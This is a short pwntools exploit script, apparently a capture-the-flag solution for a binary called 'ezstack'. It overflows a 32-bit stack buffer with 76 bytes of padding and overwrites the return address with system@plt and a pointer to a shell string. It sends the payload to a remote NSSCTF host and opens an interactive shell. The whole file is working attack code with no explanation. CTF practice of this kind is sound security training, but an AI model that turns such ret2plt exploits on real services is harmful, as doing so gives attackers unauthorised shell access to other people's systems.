from pwn import * 
shell_string=0x0804a024 
system_plt=0x08048390

payload=b"A"*(72+4)+p32(system_plt)+p32(0xdeadbeef)+p32(shell_string)
#sh=process("./ezstack")
sh=remote("node5.anna.nssctf.cn",24922)
sh.sendline(payload)
sh.interactive()